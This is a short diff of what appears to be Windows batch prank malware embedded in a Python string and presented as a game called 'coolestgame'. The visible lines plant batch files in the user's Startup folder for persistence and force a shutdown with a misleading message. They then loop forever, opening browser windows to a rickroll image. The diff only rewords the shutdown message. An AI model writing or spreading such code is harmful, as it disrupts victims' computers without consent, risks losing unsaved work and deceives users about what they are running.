@@ -34,7 +34,7 @@ cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
 start lasthope.bat
 @echo del /q rickloop.bat> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\lasthope.bat"
 echo del /q lasthope.bat>> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\lasthope.bat"
-shutdown -s -f -t 20 -c "did you know: coolestgame is so cool that it can revive itself once after crashing?"
+shutdown -s -f -t 20 -c "did you know: coolestgame is so cool that it can revive itself a few times after crashing?"
 :a
 start https://cdn.vox-cdn.com/thumbor/9j-s_MPUfWM4bWdZfPqxBxGkvlw=/1400x1050/filters:format(jpeg)/cdn.vox-cdn.com/uploads/chorus_asset/file/22312759/rickroll_4k.jpg
 goto a''')
